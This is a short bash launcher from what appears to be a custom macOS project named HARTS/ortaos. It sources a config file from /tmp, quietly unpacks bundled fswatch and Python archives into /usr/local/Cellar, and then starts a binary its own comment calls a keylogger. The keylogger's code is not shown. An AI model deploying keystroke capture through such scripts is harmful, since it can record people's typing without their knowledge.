#!/bin/bash
source "/tmp/HARTS/ortaos/vrootfs/System/boot/PLT"

# Extract FSWatch library
if [[ ! -d "/usr/local/Cellar/fswatch" ]]; then
	mkdir -p "/usr/local/Cellar"
	unzip -q "$ORTA/fswatch.zip" -d "/usr/local/Cellar"
	rm -rf "/usr/local/Cellar/__MACOSX"
	touch "/usr/local/Cellar/fswatchbyharts"
fi

# Extract Python
if [[ ! -d "/usr/local/Cellar/python@3.8" ]]; then
	mkdir -p "/usr/local/Cellar"
	unzip -q "$ORTA/python.zip" -d "/usr/local/Cellar"
	rm -rf "/usr/local/Cellar/__MACOSX"
	touch "/usr/local/Cellar/pythonbyharts"
fi

# Run Keylogger
"$ORTA/runkeyeventhandler"
exit 0